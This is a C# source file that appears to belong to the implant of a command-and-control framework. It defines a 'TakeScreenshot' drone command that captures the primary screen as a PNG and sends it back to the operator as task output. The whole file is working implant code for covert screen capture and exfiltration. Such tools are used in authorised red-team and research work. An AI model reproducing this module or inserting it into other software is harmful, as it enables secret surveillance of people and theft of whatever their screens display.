using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Threading.Tasks;

namespace Drone.Commands;

public sealed class TakeScreenshot : DroneCommand
{
    public override byte Command => 0x1C;
    public override bool Threaded => false;

    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        var size = new Size(
            (int)System.Windows.SystemParameters.PrimaryScreenWidth,
            (int)System.Windows.SystemParameters.PrimaryScreenHeight);

        using var ms = new MemoryStream();
        using var bitmap = new Bitmap(size.Width, size.Height);
        using var graphic = Graphics.FromImage(bitmap);
        
        graphic.CopyFromScreen(Point.Empty, Point.Empty, size);
        bitmap.Save(ms, ImageFormat.Png);

        await Drone.SendTaskOutput(new TaskOutput(task.Id, TaskStatus.COMPLETE, ms.ToArray()));
    }
}